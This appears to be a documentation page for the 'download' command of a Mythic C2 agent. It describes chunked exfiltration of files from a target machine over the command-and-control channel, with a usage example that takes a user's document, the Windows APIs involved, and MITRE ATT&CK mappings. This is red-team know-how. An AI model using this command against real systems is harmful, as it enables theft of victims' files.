+++
title = "download"
chapter = false
weight = 103
+++

## Summary

Download (exfiltrate) a file from the target to the Mythic server.

- **Needs Admin:** False
- **Version:** 1
- **Author:** @Lavender-exe

### Arguments

- **file** (String, required) - Full path of the file to download from the target.

### Usage

```
download C:\Users\jsmith\Documents\sensitive.docx
```

## Detailed Summary

Implements the Mythic multi-step download protocol:

1. **Init** - Opens the file, determines size, calculates chunk count (512KB chunks), sends download init message with total chunks, file path, and filename
2. **Chunking** - Mythic responds with a `file_id`. The agent reads and sends each chunk sequentially, tagged with the `file_id` and chunk number
3. **Completion** - After all chunks are sent, the file is closed

Large files are transferred in 512KB chunks to avoid memory exhaustion in the PIC agent. Each chunk is included in the agent's next beacon response.

### APIs Used

| API | Purpose |
|-----|---------|
| `CreateFileW` | Open file for reading |
| `GetFileSizeEx` | Determine total file size |
| `ReadFile` | Read file chunks |
| `CloseHandle` | Close file handle |

## MITRE ATT&CK Mapping

- **T1041** - Exfiltration Over C2 Channel
- **T1005** - Data from Local System
